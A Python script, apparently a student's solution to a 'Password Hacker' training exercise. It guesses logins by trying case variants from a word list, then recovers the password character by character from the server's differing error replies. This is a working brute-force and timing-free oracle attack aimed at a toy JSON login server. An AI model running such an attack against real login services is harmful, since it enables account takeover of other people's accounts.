def hack(ip, port):
    global login
    import socket
    hack_sock = socket.socket()
    address = (ip, int(port))
    hack_sock.connect(address)
    import itertools
    a = open('C:/Users/Carbon/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt', "r")
    import itertools, json
    counter = 0
    def send_response(message):
        message = json.dumps(message)
        message = message.encode()
        hack_sock.send(message)
        response = hack_sock.recv(1024)
        response = response.decode()
        response = json.loads(response)
        return response
    for i in a:
        if counter != 0:
            break
        i = i.strip("\n")
        psy = i
        search = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in psy)))



        for m in search:
            message = {"login": m, "password": " "}
            if send_response(message) == {"result": "Wrong password!"}:
                login = m
                counter = 1
                break


    import string
    nums = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    alphabet_list = list(string.ascii_lowercase) + nums + list(string.ascii_uppercase)
    counter = 0
    password = ""
    prepass = ""
    x = {"login":login, "password": ""}
    while counter == 0:
        for m in alphabet_list:
            prepass = password + m
            message = {"login": login, "password": prepass}
            resp = send_response(message)
            if resp == {"result": "Exception happened during login"}:
                password = prepass
                break
            elif resp == {"result": "Connection success!"}:
                password = prepass
                x["password"] = password
                x = json.dumps(x)
                print(x)
                counter = 1
                break
    hack_sock.close()


import sys

args = sys.argv
hack(args[1], args[2])